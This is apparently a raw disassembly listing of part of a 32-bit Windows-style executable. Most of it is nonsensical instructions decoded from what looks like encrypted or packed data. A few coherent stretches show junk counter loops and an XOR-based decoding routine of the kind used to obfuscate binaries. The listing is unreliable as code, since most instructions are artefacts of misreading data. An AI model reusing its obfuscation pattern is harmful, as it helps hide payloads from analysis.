  4070b9:	rol    DWORD PTR [eax+edi*1-0x67a1db6e],cl
  4070c0:	je     0x4070a4
  4070c2:	and    BYTE PTR [edi+0x45ee5661],0xd2
  4070c9:	sbb    BYTE PTR [edx],0x9f
  4070cc:	ins    DWORD PTR es:[edi],dx
  4070cd:	mov    dh,0x16
  4070cf:	rol    DWORD PTR ds:0x9826a5c1,cl
  4070d5:	adc    eax,0x5d4778e9
  4070da:	repnz mul ecx
  4070dd:	jne    0x4070ad
  4070df:	push   cs
  4070e0:	sbb    esp,ecx
  4070e2:	xchg   ch,bh
  4070e4:	int    0x3e
  4070e6:	sub    al,0x41
  4070e8:	adc    eax,0xf3fff8cf
  4070ed:	ds inc ebp
  4070ef:	nop
  4070f0:	and    al,0x8b
  4070f2:	mov    dh,0x27
  4070f4:	mov    ?,WORD PTR ds:0xde2fdd5a
  4070fa:	iret   
  4070fb:	push   ds
  4070fc:	rcl    ecx,cl
  4070fe:	jne    0x407127
  407100:	(bad)  
  407101:	std    
  407102:	sub    DWORD PTR [edi-0x5b],0xae676566
  407109:	add    DWORD PTR [ecx+0x3c57b487],esp
  40710f:	outs   dx,BYTE PTR ds:[esi]
  407110:	sbb    BYTE PTR [ebx+0x42571c6c],dh
  407116:	xchg   BYTE PTR [ecx-0x37c94aa1],dl
  40711c:	out    0xd0,eax
  40711e:	and    DWORD PTR [edi+0x560b51c9],ebx
  407124:	pop    ecx
  407125:	inc    ebp
  407126:	adc    ah,cl
  407128:	adc    BYTE PTR [esi+0x171a075d],cl
  40712e:	cdq    
  40712f:	push   ds
  407130:	(bad)  
  407131:	aaa    
  407132:	push   0xffffffb8
  407134:	sub    BYTE PTR [esi+0x5],bl
  407137:	cmp    eax,0x3e1e69b8
  40713c:	inc    ebp
  40713d:	std    
  40713e:	adc    eax,0x6d15c327
  407143:	repz out dx,eax
  407145:	call   0xcb93:0xae2fda06
  40714c:	push   ecx
  40714d:	mul    DWORD PTR [edx]
  40714f:	ror    dh,0xdc
  407152:	fidiv  DWORD PTR ds:0xc5623055
  407158:	xchg   ebx,eax
  407159:	mov    dh,ah
  40715b:	lea    esi,[edx]
  40715d:	mov    ds:0x86c61d0e,al
  407162:	loop   0x407186
  407164:	mov    ah,0x42
  407166:	sub    ah,BYTE PTR [ebp+0x46]
  407169:	icebp  
  40716a:	pop    ss
  40716b:	jge    0x40713c
  40716d:	jne    0x40718c
  40716f:	cmp    ebp,ecx
  407171:	rol    esi,cl
  407173:	ins    BYTE PTR es:[edi],dx
  407174:	pop    edx
  407175:	mov    edx,0x2d2d915
  40717a:	(bad)  
  40717b:	out    dx,al
  40717c:	(bad)  
  40717d:	or     al,0x15
  40717f:	jge    0x40711c
  407181:	inc    esp
  407182:	icebp  
  407183:	into   
  407184:	or     cl,bl
  407186:	cmp    BYTE PTR [eax-0x6ad9cfa8],bl
  40718c:	aas    
  40718d:	jb     0x407144
  40718f:	outs   dx,BYTE PTR ds:[esi]
  407190:	daa    
  407191:	jne    0x4071a4
  407193:	cli    
  407194:	shr    DWORD PTR [ebx+0x43],1
  407197:	lea    ebx,[esi-0x5e607e66]
  40719d:	fbld   TBYTE PTR [esi-0x2d]
  4071a0:	jge    0x40714d
  4071a2:	push   0x8
  4071a4:	test   BYTE PTR [eax],0x56
  4071a7:	loop   0x407205
  4071a9:	jmp    0xf8bd:0x322b938e
  4071b0:	cmp    BYTE PTR [esi+0x53ccb78e],cl
  4071b6:	pop    ecx
  4071b7:	xchg   edx,eax
  4071b8:	mov    dh,0x45
  4071ba:	je     0x4071d7
  4071bc:	xchg   ebp,edi
  4071be:	mov    al,0x20
  4071c0:	jo     0x4071a2
  4071c2:	jo     0x4071bc
  4071c4:	ja     0x407163
  4071c6:	(bad)  
  4071c7:	cmp    BYTE PTR [edx],dh
  4071c9:	scas   eax,DWORD PTR es:[edi]
  4071ca:	int    0x59
  4071cc:	pop    ebp
  4071cd:	fs ret 0xacbf
  4071d1:	jae    0x4071d5
  4071d3:	cwde   
  4071d4:	outs   dx,DWORD PTR ds:[esi]
  4071d5:	pushf  
  4071d6:	shl    dl,1
  4071d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071d9:	shl    BYTE PTR [ebx-0x1fc623b9],1
  4071df:	jmp    0x4071a5
  4071e1:	shl    DWORD PTR [edx+eax*1],cl
  4071e4:	std    
  4071e5:	push   ss
  4071e6:	and    dl,BYTE PTR ds:0xad42c37c
  4071ec:	(bad)  
  4071ed:	in     eax,0x5e
  4071ef:	push   cs
  4071f0:	test   al,0xa8
  4071f2:	(bad)
  4071f5:	outs   dx,DWORD PTR cs:[esi]
  4071f7:	inc    edx
  4071f8:	jbe    0x407274
  4071fa:	xchg   ebx,eax
  4071fb:	push   ebp
  4071fc:	pop    ebp
  4071fd:	out    dx,eax
  4071fe:	inc    ebp
  4071ff:	xchg   edi,eax
  407200:	fs aad 0x34
  407203:	int    0xb2
  407205:	in     al,dx
  407206:	enter  0x8051,0xa1
  40720a:	(bad)  
  40720b:	mov    dl,0x7
  40720d:	aam    0xab
  40720f:	dec    ecx
  407210:	cmp    al,0xf7
  407212:	lods   al,BYTE PTR ds:[si]
  407214:	rcr    DWORD PTR [esi+0x4caa5b86],0x63
  40721b:	mov    bl,0xab
  40721d:	adc    eax,0xe2eaa6da
  407222:	sar    BYTE PTR [esi],cl
  407224:	mov    bh,0x93
  407226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407227:	mov    ecx,0x27a2df52
  40722c:	in     eax,0x55
  40722e:	adc    BYTE PTR [eax],dl
  407230:	push   ebp
  407231:	xchg   edx,eax
  407232:	inc    esi
  407233:	fsubr  DWORD PTR [esi+0x1f81195a]
  407239:	mov    ah,0xd8
  40723b:	repz inc eax
  40723d:	fst    st(0)
  40723f:	xchg   ebp,eax
  407240:	pop    ds
  407241:	retf   0xfc82
  407244:	pop    ss
  407245:	dec    eax
  407246:	cmp    eax,0xad950a80
  40724b:	test   eax,0x86c074e8
  407250:	fld1   
  407252:	sub    cl,bh
  407254:	sub    ebp,DWORD PTR [ebp+0x18b7c565]
  40725a:	imul   ecx,DWORD PTR [eax+eax*2-0x2ac7924f],0x75
  407262:	mov    eax,ds:0x76148f03
  407267:	dec    esi
  407268:	sbb    eax,0xfefc9241
  40726d:	in     al,dx
  40726e:	adc    al,0x2e
  407270:	push   0xffffffe0
  407272:	cmc    
  407273:	or     DWORD PTR [edx],esi
  407275:	push   eax
  407276:	int3   
  407277:	pop    ds
  407278:	int3   
  407279:	pop    es
  40727a:	cld    
  40727b:	es dec edi
  40727d:	pop    eax
  40727e:	ret    0x2ee1
  407281:	add    eax,0x2fb2b805
  407286:	sub    eax,0x73fb0fae
  40728b:	lahf   
  40728c:	add    DWORD PTR [esi+eax*1],ebx
  40728f:	pop    ss
  407290:	xor    ch,BYTE PTR [edx+0xe]
  407293:	add    eax,0x6f2a493c
  407298:	popa   
  407299:	sbb    eax,0x2672ce46
  40729e:	stc    
  40729f:	xchg   esp,eax
  4072a0:	dec    ebx
  4072a1:	jle    0x40728c
  4072a3:	cmp    eax,0x58e6b91
  4072a8:	mov    esi,DWORD PTR [eax]
  4072aa:	pop    ebx
  4072ab:	fs adc al,0x80
  4072ae:	nop
  4072af:	sbb    eax,0x57
  4072b2:	or     bh,BYTE PTR [esi]
  4072b4:	cdq    
  4072b5:	call   0x13bf6230
  4072ba:	leave  
  4072bb:	add    ebp,DWORD PTR [edx-0x5e59e0c7]
  4072c1:	gs int3 
  4072c3:	sbb    eax,0x421403d6
  4072c8:	xor    al,0x7d
  4072ca:	inc    esi
  4072cb:	enter  0xe01d,0xd6
  4072cf:	or     BYTE PTR [edi-0x20],bh
  4072d2:	outs   dx,DWORD PTR ds:[esi]
  4072d3:	(bad)  
  4072d4:	mov    dl,0x2f
  4072d6:	add    ebp,ebx
  4072d8:	push   esp
  4072d9:	stc    
  4072da:	jg     0x407294
  4072dc:	hlt    
  4072dd:	rcl    DWORD PTR [esi+esi*2+0x7232604f],1
  4072e4:	addr16 add al,0xfe
  4072e7:	pop    eax
  4072e8:	daa    
  4072e9:	xchg   esp,eax
  4072ea:	sub    eax,0x2da78abf
  4072ef:	add    esi,eax
  4072f1:	cmp    eax,0x96cb1875
  4072f6:	stc    
  4072f7:	dec    ebp
  4072f8:	ins    DWORD PTR es:[edi],dx
  4072f9:	jge    0x4072a1
  4072fb:	add    edx,DWORD PTR [ebp-0x3abd817c]
  407301:	push   cs
  407302:	cmp    DWORD PTR [ebx],0x9413661b
  407308:	bt     ecx,edx
  40730b:	shl    DWORD PTR [ecx],0x96
  40730e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40730f:	push   ds
  407310:	sbb    cl,BYTE PTR ds:[ecx+0x306b3f27]
  407317:	add    eax,0xd7bc5e93
  40731c:	add    DWORD PTR [ecx],ecx
  40731e:	push   esi
  40731f:	mov    edi,0xc60fad24
  407324:	inc    ebp
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a77925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x4a577e86,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x40739e
  4073b7:	sahf   
  4073b8:	mov    ebx,0x7a9941bf
  4073bd:	lock call 0x56d1:0x130f901c
  4073c5:	sahf   
  4073c6:	mov    esp,0xe5dcb372
  4073cb:	call   0xf0b257d0
  4073d0:	xchg   esi,eax
  4073d1:	inc    esi
  4073d2:	mov    esp,0xb93c7649
  4073d7:	fist   DWORD PTR [edx-0x5a]
  4073da:	retf   0x5ac0
  4073dd:	imul   esi,edi,0xed9dc29a
  4073e3:	in     al,0xe1
  4073e5:	retf   
  4073e6:	cmp    ch,BYTE PTR [edi]
  4073e8:	xchg   edi,eax
  4073e9:	jno    0x40738d
  4073eb:	xchg   ecx,eax
  4073ec:	outs   dx,DWORD PTR ds:[esi]
  4073ed:	(bad)  
  4073ee:	pop    esp
  4073ef:	sbb    eax,0x9ccb78aa
  4073f4:	div    BYTE PTR [ebx-0x6b964908]
  4073fa:	sbb    eax,0x74e1e35
  4073ff:	push   0xc38bfe7d
  407404:	les    ebp,FWORD PTR [eax]
  407406:	inc    ebx
  407407:	xchg   ebx,eax
  407408:	enter  0x57d6,0x1e
  40740c:	loopne 0x407391
  40740e:	in     al,dx
  40740f:	fimul  DWORD PTR [ecx]
  407411:	jae    0x407440
  407413:	push   cs
  407414:	sbb    ch,BYTE PTR [eax-0x48482f8c]
  40741a:	retf   
  40741b:	jmp    0x407430
  40741d:	push   edi
  40741e:	add    eax,0x2e9bed49
  407423:	cs mov bh,0x39
  407426:	mov    ah,0x32
  407428:	(bad)  
  407429:	fwait
  40742a:	add    edx,edi
  40742c:	and    eax,0xb146f882
  407431:	and    ah,BYTE PTR [eax+0x1bd07d7d]
  407437:	popf   
  407438:	sti    
  407439:	fsubr  QWORD PTR [ebp+0x2f6b1701]
  40743f:	out    dx,eax
  407440:	sbb    BYTE PTR [ebx+0x36f87dcd],al
  407446:	and    BYTE PTR [edx],bl
  407448:	cli    
  407449:	xor    edi,DWORD PTR [ecx]
  40744b:	into   
  40744c:	mov    bl,0x95
  40744e:	bound  ecx,QWORD PTR [edx+0x180bb3bc]
  407454:	xor    DWORD PTR [ebp+0x69f8b71],0x7ea5f647
  40745e:	lock dec esp
  407460:	mov    ah,0xd9
  407462:	sub    ah,BYTE PTR gs:[edx-0x4295523a]
  407469:	inc    ecx
  40746a:	mov    ch,0xaf
  40746c:	push   0x27
  40746e:	fistp  QWORD PTR [esi+0x66]
  407471:	sbb    esi,DWORD PTR ds:0x77ca8db1
  407477:	retf   0xed8f
  40747a:	inc    ebp
  40747b:	mov    bh,BYTE PTR [ecx-0x36]
  40747e:	leave  
  40747f:	(bad)  
  407480:	and    DWORD PTR [esi-0x482c9ab7],esp
  407486:	push   eax
  407487:	pop    esp
  407488:	mov    esi,0x4dca2e83
  40748d:	pop    esp
  40748e:	call   0xe187:0xb8214721
  407495:	or     al,0x63
  407497:	jbe    0x40744d
  407499:	sar    DWORD PTR [edi+0x34],0x24
  40749d:	and    dh,dl
  40749f:	shr    BYTE PTR [edi-0x5374d792],0xd9
  4074a6:	rol    DWORD PTR [edx+0x53],1
  4074a9:	xchg   esi,eax
  4074aa:	and    bh,BYTE PTR [edi]
  4074ac:	jp     0x407513
  4074ae:	(bad)  
  4074b0:	push   ebx
  4074b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b2:	mov    ch,0xb9
  4074b4:	rol    BYTE PTR [ebx-0x7c4b8443],0xf7
  4074bb:	out    0x44,al
  4074bd:	fisub  WORD PTR [ecx-0x54ba998d]
  4074c3:	mov    ch,0xeb
  4074c5:	cmc    
  4074c6:	gs cmp al,0xf7
  4074c9:	push   ss
  4074ca:	mov    DWORD PTR ss:[edi+0x3e7dd0e6],ebx
  4074d1:	push   ds
  4074d2:	popf   
  4074d3:	jmp    0x6a80:0x1faa90da
  4074da:	mov    WORD PTR [eax-0x6ffd6b3],gs
  4074e0:	sbb    BYTE PTR [eax-0x344c62e0],ch
  4074e6:	mov    WORD PTR [edi-0x6a],ds
  4074e9:	dec    esp
  4074ea:	adc    al,0xf1
  4074ec:	xchg   ebp,eax
  4074ed:	and    ah,BYTE PTR [ecx-0x2]
  4074f0:	push   es
  4074f1:	mov    ch,0x7b
  4074f3:	or     DWORD PTR [ebp-0x4270ab6c],0xc434a710
  4074fd:	popf   
  4074fe:	mov    bl,0xca
  407500:	retf   0xc8eb
  407503:	xchg   ecx,eax
  407504:	and    eax,DWORD PTR [edx-0x7e8e44e2]
  40750a:	and    ebp,DWORD PTR [ecx-0x740968de]
  407510:	ficomp DWORD PTR [edx+ebp*8-0x50]
  407514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407515:	mov    cl,0x9c
  407517:	sub    eax,0xd30c9941
  40751c:	push   es
  40751d:	test   eax,0xcd676679
  407522:	nop
  407523:	lds    ebp,FWORD PTR [ecx+0x198baecc]
  407529:	iret   
  40752a:	jle    0x407586
  40752c:	mov    edi,?
  40752e:	in     eax,dx
  40752f:	or     BYTE PTR [esi+0x27],bl
  407532:	and    ah,BYTE PTR [esi+0x742d20f2]
  407538:	mov    ch,0x99
  40753a:	cwde   
  40753b:	imul   ebp,DWORD PTR [edi],0x21fd18e8
  407541:	pop    edx
  407542:	or     ebp,DWORD PTR [eax+0x57]
  407545:	(bad)  
  407546:	shr    DWORD PTR [esi-0x21],cl
  407549:	mov    ebx,0x37d891f3
  40754e:	dec    edi
  40754f:	cmp    dl,ch
  407551:	mov    dh,0xb4
  407553:	ins    DWORD PTR es:[edi],dx
  407554:	or     esp,DWORD PTR [ebp-0x58]
  407557:	adc    dh,BYTE PTR [ecx+0x74]
  40755a:	sub    bh,BYTE PTR [edx-0x1cc036a0]
  407560:	jle    0x4075d1
  407562:	inc    edx
  407563:	sub    BYTE PTR [ecx],0x46
  407566:	int    0x82
  407568:	adc    edx,DWORD PTR [ebp+ecx*4+0x66d90d88]
  40756f:	test   eax,0x60bed22c
  407574:	push   ecx
  407575:	mov    eax,ds:0x15c30dbd
  40757a:	int3   
  40757b:	jno    0x4075ba
  40757d:	call   0xd9f2a8a9
  407582:	imul   edx,DWORD PTR [eax+edi*8+0x2],0x2e
  407587:	sbb    DWORD PTR [edx],ebp
  407589:	xor    al,0xb9
  40758b:	fisttp DWORD PTR [edx]
  40758d:	mov    edx,0x752b814a
  407592:	stos   DWORD PTR es:[edi],eax
  407593:	or     DWORD PTR [esi],0x76
  407596:	lock scas eax,DWORD PTR es:[edi]
  407598:	and    DWORD PTR [edx-0x53],0xab650430
  40759f:	sbb    edx,eax
  4075a1:	xchg   edi,eax
  4075a2:	adc    BYTE PTR [ebx],0x90
  4075a5:	int    0x5f
  4075a7:	lods   al,BYTE PTR ds:[esi]
  4075a8:	xchg   DWORD PTR [eax+0x49],edx
  4075ab:	(bad)  
  4075ac:	imul   esp,ecx,0x52
  4075af:	fldenv [ebp+0x19]
  4075b2:	add    al,0x2b
  4075b4:	mov    ds:0x478a3a8b,eax
  4075b9:	and    DWORD PTR [eax-0x14],eax
  4075bc:	add    ch,ah
  4075be:	inc    ebx
  4075bf:	cmc    
  4075c0:	xor    al,0x25
  4075c2:	inc    edi
  4075c3:	leave  
  4075c4:	fsub   QWORD PTR [ebp-0x47]
  4075c7:	das    
  4075c8:	out    0xfe,eax
  4075ca:	loope  0x4075b7
  4075cc:	push   cs
  4075cd:	enter  0x2f1d,0x1c
  4075d1:	bound  ebp,QWORD PTR [eax-0x23]
  4075d4:	xor    dh,BYTE PTR [eax-0x60]
  4075d7:	mov    esi,0x3a69668e
  4075dc:	inc    edx
  4075dd:	loop   0x4075d5
  4075df:	test   DWORD PTR [ebx],edi
  4075e1:	inc    ecx
  4075e2:	push   cs
  4075e3:	outs   dx,BYTE PTR ds:[esi]
  4075e4:	dec    edi
  4075e5:	xchg   edi,eax
  4075e6:	lods   al,BYTE PTR ds:[esi]
  4075e7:	test   eax,0xf786c427
  4075ec:	shl    BYTE PTR [ebx],cl
  4075ee:	push   ebp
  4075ef:	and    DWORD PTR [ecx-0x49],esi
  4075f2:	mov    WORD PTR [eax],?
  4075f4:	cdq    
  4075f5:	inc    eax
  4075f6:	mov    ds:0x1fda18da,eax
  4075fb:	mov    bl,ch
  4075fd:	(bad)  
  4075fe:	mov    WORD PTR [edi],cs
  407600:	or     ecx,ebx
  407602:	or     BYTE PTR [esi+0x59db3713],dl
  407608:	add    ah,BYTE PTR [esi]
  40760a:	scas   al,BYTE PTR es:[edi]
  40760b:	loope  0x407634
  40760d:	push   cs
  40760e:	push   ds
  40760f:	push   es
  407610:	dec    ebp
  407611:	nop
  407612:	shl    eax,1
  407614:	jle    0x4075f1
  407616:	in     al,dx
  407617:	adc    DWORD PTR [ebx],ebx
  407619:	std    
  40761a:	and    BYTE PTR [edx*1-0x2cbe9440],ch
  407621:	pusha  
  407622:	mov    ecx,0xd39dc9db
  407627:	inc    edx
  407628:	rcr    DWORD PTR fs:[edi+0x67566266],0x4f
  407630:	aad    0x9c
  407632:	fiadd  WORD PTR [ebp*4-0x374af8df]
  407639:	sbb    eax,DWORD PTR [esi]
  40763b:	out    0x9c,eax
  40763d:	popf   
  40763e:	repnz imul eax,eax,0x979f94be
  407645:	retf   
  407646:	add    DWORD PTR [ebp+0x57689e42],ebp
  40764c:	sbb    BYTE PTR [ecx+edi*8+0x1b5c97c8],bh
  407653:	pop    ds
  407654:	jmp    0x40766e
  407656:	cmp    DWORD PTR [esi+0x7b],esi
  407659:	pop    ebp
  40765a:	jns    0x4076c3
  40765c:	xchg   edi,eax
  40765d:	sbb    al,0xf6
  40765f:	dec    edx
  407660:	out    dx,eax
  407661:	shl    BYTE PTR [esi-0x66],cl
  407664:	jge    0x407699
  407666:	pushfw 
  407668:	jne    0x407625
  40766a:	loopne 0x4076e5
  40766c:	inc    ebp
  40766d:	xchg   ecx,eax
  40766e:	(bad)  
  40766f:	leave  
  407670:	xor    eax,0xcc812ca2
  407675:	loop   0x40763e
  407677:	or     ecx,DWORD PTR [esi]
  407679:	xlat   BYTE PTR ds:[ebx]
  40767a:	jnp    0x40761c
  40767c:	ins    DWORD PTR es:[edi],dx
  40767d:	jbe    0x407619
  40767f:	aam    0x17
  407681:	aas    
  407682:	pushf  
  407683:	bnd jae 0x40766f
  407686:	mov    ch,0x4f
  407688:	sub    bl,BYTE PTR [eax-0x628c443b]
  40768e:	jbe    0x407687
  407690:	inc    edi
  407691:	enter  0xc933,0xd0
  407695:	fucomip st,st(2)
  407697:	xchg   ecx,eax
  407698:	and    ah,BYTE PTR [edi-0x29513142]
  40769e:	adc    eax,0x896268e0
  4076a3:	inc    ebp
  4076a4:	lock mov al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a761,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx+0x57ae76e8],1
  407796:	(bad)  
  407797:	fsub   QWORD PTR [ebx-0x50]
  40779a:	(bad)  
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x40778f
  4077a2:	add    eax,DWORD PTR [edi]
  4077a4:	cmp    BYTE PTR [ebp+0x57],bh
  4077a7:	xchg   ebp,eax
  4077a8:	ja     0x4077d0
  4077aa:	push   ss
  4077ab:	xor    BYTE PTR [edx],0x38
  4077ae:	jno    0x407736
  4077b0:	dec    esp
  4077b1:	sub    eax,0xbc823130
  4077b6:	pop    ss
  4077b7:	or     ch,BYTE PTR [ebx-0x1e]
  4077ba:	adc    eax,0x5e60bf6b
  4077bf:	sbb    DWORD PTR [edi+ebp*2],esp
  4077c2:	jle    0x40780c
  4077c4:	add    cl,bh
  4077c6:	inc    esi
  4077c7:	jmp    0x42cc079e
  4077cc:	test   eax,0x44855173
  4077d1:	loope  0x4077a1
  4077d3:	ins    BYTE PTR es:[edi],dx
  4077d4:	push   ds
  4077d5:	ins    DWORD PTR es:[edi],dx
  4077d6:	mov    bh,0xdd
  4077d8:	loopne 0x4077e3
  4077da:	xchg   edi,eax
  4077db:	mov    BYTE PTR [ebp+0x43],cl
  4077de:	scas   al,BYTE PTR es:[edi]
  4077df:	xchg   esi,eax
  4077e0:	test   BYTE PTR [eax],dh
  4077e2:	pusha  
  4077e3:	popf   
  4077e4:	mov    eax,DWORD PTR [ecx+edx*4]
  4077e7:	pop    es
  4077e8:	push   0xfffffff4
  4077ea:	add    bh,BYTE PTR [edx]
  4077ec:	xor    al,0xe7
  4077ee:	jmp    0x25e1:0x1cc48610
  4077f5:	push   edx
  4077f6:	adc    eax,0x31de8846
  4077fb:	fisub  DWORD PTR [esi+0x351afd58]
  407801:	scas   eax,DWORD PTR es:[edi]
  407802:	loopne 0x40779f
  407804:	test   BYTE PTR [esi+edi*2+0x15639fb1],ah
  40780b:	cld    
  40780c:	jb     0x40785d
  40780e:	mov    edi,0xa3dfc4eb
  407813:	dec    ebp
  407814:	mov    ecx,0x4710e3c5
  407819:	ins    DWORD PTR es:[edi],dx
  40781a:	and    ecx,DWORD PTR [ebp-0x30a4f0b]
  407820:	ret    0x4bdb
  407823:	fld    st(7)
  407825:	xlat   BYTE PTR ds:[ebx]
  407826:	mov    edi,0x94dfe72b
  40782b:	cmp    DWORD PTR [eax],0x5d9bab89
  407831:	aad    0x7e
  407833:	jb     0x4077f2
  407835:	mov    cl,0x8b
  407837:	enter  0xc8b6,0x93
  40783b:	jle    0x407889
  40783d:	cmp    BYTE PTR [ecx+0x4a],ch
  407840:	cld    
  407841:	xchg   esp,eax
  407842:	mov    bh,0x5
  407844:	rcl    BYTE PTR [edi+0x5be19843],1
  40784a:	retf   0x4fa5
  40784d:	scas   eax,DWORD PTR es:[edi]
  40784e:	mov    ds:0xf91be4a0,al
  407853:	sar    DWORD PTR [eax-0x64],cl
  407856:	add    BYTE PTR [edx],bl
  407858:	test   DWORD PTR [edi-0x60],edx
  40785b:	jmp    DWORD PTR [esi]
  40785d:	call   0x9068d8f3
  407862:	retf   0x71d2
  407865:	popfw  
  407867:	test   dl,al
  407869:	xchg   ecx,eax
  40786a:	push   esp
  40786b:	mov    dh,0x2
  40786d:	push   esi
  40786e:	mov    ah,0x3
  407870:	mov    al,0xe8
  407872:	jmp    0xcaa5:0xbbde244f
  407879:	fcom   DWORD PTR [edi+0x6f56fea1]
  40787f:	and    eax,0xa8ee965
  407884:	lahf   
  407885:	cmp    al,0x74
  407887:	mov    al,ds:0x68a94141
  40788c:	dec    esp
  40788d:	xchg   esp,eax
  40788e:	push   0xf31f50a0
  407893:	aad    0xf
  407895:	out    dx,al
  407896:	shl    ebp,1
  407898:	inc    BYTE PTR [eax-0x8e4bf6d]
  40789e:	lock cmp DWORD PTR [edx],edx
  4078a1:	into   
  4078a2:	add    BYTE PTR [ebx],al
  4078a4:	jno    0x4078f0
  4078a6:	xor    BYTE PTR [ecx],bl
  4078a8:	loop   0x4078be
  4078aa:	sbb    ecx,DWORD PTR [ecx-0x208f9a30]
  4078b0:	lds    ebx,FWORD PTR [esi+0x6]
  4078b3:	jo     0x407866
  4078b5:	test   DWORD PTR [bp+di-0x44ab],ebx
  4078ba:	nop
  4078bb:	or     DWORD PTR [edx+0xc],edi
  4078be:	lods   al,BYTE PTR ds:[esi]
  4078bf:	xchg   edx,ecx
  4078c1:	or     al,0x5a
  4078c3:	out    0x7e,al
  4078c5:	iret   
  4078c6:	pushf  
  4078c7:	jns    0x407906
  4078c9:	sahf   
  4078ca:	scas   al,BYTE PTR es:[edi]
  4078cb:	call   0xc8a9:0x85111ed8
  4078d2:	inc    eax
  4078d3:	shr    DWORD PTR [ecx],1
  4078d5:	push   eax
  4078d6:	pop    esi
  4078d7:	fild   DWORD PTR [eax+0x30fb5b5c]
  4078dd:	mov    eax,ds:0xa6189404
  4078e2:	shr    DWORD PTR [ecx+0x11],cl
  4078e5:	int3   
  4078e6:	fcomp  st(3)
  4078e8:	dec    edx
  4078e9:	pop    ss
  4078ea:	mov    esp,0x3d3fde3c
  4078ef:	jno    0x407947
  4078f1:	das    
  4078f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f3:	lea    esp,[ebp+ecx*2-0x4968d2ee]
  4078fa:	(bad)  
  4078fb:	ins    DWORD PTR es:[edi],dx
  4078fc:	(bad)  
  4078fd:	mov    esp,0x5db1846c
  407902:	mov    fs,WORD PTR [esp+ecx*8+0x23948954]
  407909:	dec    ecx
  40790a:	xor    ecx,DWORD PTR [eax-0x14f83545]
  407910:	pop    ecx
  407911:	or     DWORD PTR [esi+0x51afea43],0x2d86c81d
  40791b:	pop    ss
  40791c:	shl    BYTE PTR [ebx-0xa],cl
  40791f:	popa   
  407920:	pushf  
  407921:	mov    bl,0x4f
  407923:	jmp    0x6c970982
  407928:	jne    0x407974
  40792a:	mov    esi,0xddabf783
  40792f:	xor    esi,DWORD PTR [edi]
  407931:	pusha  
  407932:	adc    DWORD PTR [ebp-0x18],esp
  407935:	mov    esi,0xe92143b6
  40793a:	add    ebp,ebx
  40793c:	adc    al,0x15
  40793e:	xor    BYTE PTR [ecx+0x4a],dh
  407941:	js     0x407928
  407943:	jg     0x40795b
  407945:	mov    DWORD PTR [esi+0x302c7fee],ebp
  40794b:	pop    ebp
  40794c:	shl    ah,0xff
  40794f:	pop    eax
  407950:	push   cs
